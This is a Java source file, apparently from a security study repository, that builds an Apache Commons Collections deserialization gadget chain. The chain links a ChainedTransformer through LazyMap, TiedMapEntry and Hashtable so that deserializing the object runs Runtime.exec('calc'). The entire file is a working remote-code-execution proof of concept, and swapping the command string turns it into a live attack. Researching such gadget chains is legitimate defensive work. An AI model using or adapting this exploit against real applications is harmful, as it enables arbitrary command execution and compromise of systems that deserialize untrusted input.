package vuln;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import util.SerializeUtil;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class Commoncollections7 {
    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        vulncc7();
    }
    public static void vulncc7() throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        ChainedTransformer fake = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(1)
        });
        ChainedTransformer chainedTransformer = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(Runtime.class),
                        new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})}
        );
        HashMap hashMap = new HashMap();
        Map decorate = LazyMap.decorate(hashMap, fake);
        decorate.put(12,12);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, 111);
        Hashtable hashtable = new Hashtable();
        hashtable.put(tiedMapEntry,1);
        decorate.clear();
        SerializeUtil.setFieldValue(decorate,"factory",chainedTransformer);
        ByteArrayOutputStream byteArrayOutputStream = SerializeUtil.writeObjectToByteArray(hashtable);
        System.out.println(byteArrayOutputStream);
        SerializeUtil.readObjectToByteArray(byteArrayOutputStream);


    }
}
